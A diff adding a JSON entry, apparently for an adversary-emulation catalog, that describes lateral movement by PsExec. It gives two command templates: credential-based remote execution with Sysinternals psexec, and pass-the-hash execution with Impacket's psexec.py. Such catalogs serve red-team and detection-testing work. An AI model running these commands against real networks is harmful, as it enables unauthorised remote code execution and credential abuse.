@@ -1,0 +1,19 @@
+{
+	"name": "Remote Process Execution with PsExec",
+	"description": "Classic lateral movement using Sysinternals or Impacket PsExec.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Sysinternals PsExec",
+			"command": "psexec \\\\TARGET -u corp\\user -p password cmd /c whoami",
+			"description": "Standard credential-based execution."
+		},
+		{
+			"index": 2,
+			"name": "Impacket PsExec",
+			"command": "psexec.py corp/user@TARGET -hashes :NTLMHASH",
+			"description": "Passwordless with hash."
+		}
+	]
+}
